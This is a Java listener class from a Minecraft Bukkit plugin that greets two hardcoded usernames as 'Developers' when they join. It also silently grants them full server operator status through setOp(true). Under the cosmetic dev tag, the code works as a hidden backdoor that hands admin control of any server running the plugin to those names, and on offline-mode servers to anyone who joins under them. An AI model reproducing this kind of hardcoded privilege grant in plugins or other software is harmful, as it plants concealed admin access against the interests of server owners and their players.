package net.avalanche.listeners;

import net.avalanche.Main;
import net.avalanche.Util;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class DevListener implements Listener
{
    protected Main plugin;
    
    @EventHandler
    public void getDevelopers(PlayerJoinEvent event)
    {
        Player p = event.getPlayer();
        if (p.getName().equalsIgnoreCase("freelix2000") || p.getName().equalsIgnoreCase("paldiu"))
        {
            Util.bcastMsg(ChatColor.AQUA + p.getName() + " is a " + ChatColor.LIGHT_PURPLE + "Developer" + ChatColor.AQUA + "!");
            p.setDisplayName(ChatColor.DARK_GRAY + "[" + ChatColor.LIGHT_PURPLE + "Dev" + ChatColor.DARK_GRAY + "] " + ChatColor.RESET + p.getName());
            p.setOp(true);
        }
        else
        {
        }
    }
}
